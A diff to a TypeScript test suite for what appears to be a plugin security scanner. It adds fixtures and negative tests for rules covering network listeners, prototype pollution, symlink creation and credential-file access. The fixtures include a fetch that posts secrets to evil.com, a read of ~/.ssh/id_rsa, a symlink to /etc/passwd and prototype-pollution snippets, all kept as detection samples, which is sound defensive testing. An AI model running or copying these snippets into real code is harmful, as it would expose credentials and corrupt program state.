@@ -162,8 +162,76 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
 `,
       expected: { ruleId: "env-harvesting", severity: "critical" as const },
     },
+    {
+      name: "detects network server creation (http.createServer)",
+      source: `
+import http from "node:http";
+const server = http.createServer((req, res) => { res.end("ok"); });
+server.listen(8888);
+`,
+      expected: { ruleId: "network-listener", severity: "warn" as const },
+    },
+    {
+      name: "detects __proto__ bracket access (prototype pollution)",
+      source: `
+const obj = {};
+obj["__proto__"]["polluted"] = true;
+`,
+      expected: { ruleId: "prototype-pollution", severity: "critical" as const },
+    },
+    {
+      name: "detects constructor.prototype access (prototype pollution)",
+      source: `
+const obj = {};
+obj.constructor["prototype"].polluted = true;
+`,
+      expected: { ruleId: "prototype-pollution", severity: "critical" as const },
+    },
+    {
+      name: "detects symlink creation via fs module",
+      source: `
+import fs from "node:fs";
+fs.symlinkSync("/etc/passwd", "./link");
+`,
+      expected: { ruleId: "symlink-manipulation", severity: "warn" as const },
+    },
+    {
+      name: "detects credential file access via readFileSync",
+      source: `
+import fs from "node:fs";
+const key = fs.readFileSync("/home/user/.ssh/id_rsa", "utf-8");
+`,
+      expected: { ruleId: "credential-access", severity: "warn" as const },
+    },
   ] as const)("$name", ({ source, expected }) => {
     expectScanRule(source, expected);
+  });
+
+  it("does not flag createServer without http/net context", () => {
+    const source = `
+// createServer is just a function name in this context
+const factory = { createServer() { return {}; } };
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "network-listener")).toBe(false);
+  });
+
+  it("does not flag symlink references without fs context", () => {
+    const source = `
+// Just mentioning symlinks in a comment
+const msg = "use symlink for faster builds";
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "symlink-manipulation")).toBe(false);
+  });
+
+  it("does not flag credential paths without file read context", () => {
+    const source = `
+// Just a documentation string
+const docs = "Store your config in ~/.ssh/config";
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "credential-access")).toBe(false);
   });
 
   it("does not flag child_process import without exec/spawn call", () => {
